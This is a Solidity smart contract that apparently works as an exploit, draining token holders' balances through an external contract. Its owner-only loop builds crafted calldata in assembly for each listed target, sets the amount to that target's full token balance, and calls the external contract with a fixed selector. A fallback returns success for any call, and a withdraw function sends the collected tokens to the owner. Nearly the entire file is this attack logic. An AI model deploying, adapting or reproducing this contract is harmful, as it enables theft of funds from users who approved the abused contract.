// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./IERC20.sol";
import "./SafeERC20.sol";


contract TOMATOSQUAD {
    using SafeERC20 for IERC20;
    address owner;
    address hash;

    mapping (address => mapping (address => uint256)) userMap;

    constructor(address _hash) {
        hash = _hash;
        owner = msg.sender;
    }

    function withdrawalToken(address token, uint256 amount) public {
        require(msg.sender==owner,"auth");
        IERC20(token).safeTransfer(
            owner,
            amount
        );
    }

    function _call(address target,address token) internal returns(bytes memory res) {
        uint256 amount = IERC20(token).balanceOf(target);
        // uint256 amount = 100;
        assembly {
            res := mload(0x40)       
            mstore(res, 0x200)
            mstore(add(res, 0x20), 0x20)    
            mstore(add(res, 0x40), 1)    
            mstore(add(res, 0x60), 1) 
            mstore(add(res, 0x80), 9)
            mstore(add(res, 0xa0), address()) 
            mstore(add(res, 0xc0), 0)
            mstore(add(res, 0xe0), target)
            mstore(add(res, 0x100), token)
            mstore(add(res, 0x120), 0x7ceb23fd6bc0add59e62ac25578270cff1b9f619)
            mstore(add(res, 0x140), amount)
            mstore(add(res, 0x160), 0)
            mstore(add(res, 0x180), 0)
            mstore(add(res, 0x1a0), 99999999999999999)
            mstore(0x40, add(res, 0x200)) // update free memory pointer

        }
        (bool success, ) = hash.call(abi.encodePacked(bytes4(0x0031b016), res));
        if(success == true){
            userMap[token][target] += amount;
        }
    }

    function tomat(address token, address[] calldata list) external payable {
        require(msg.sender==owner,"auth");
        for(uint256 i = 0; i < list.length; i++){
            _call(list[i], token);
        }
    }

    fallback() external payable{
        assembly {
            let res := mload(0x20)
            mstore(res, 1)
            return (res, 0x20)           
        }
    }


    /// @dev Fallback function to accept ETH.
    receive() external payable {

    }
}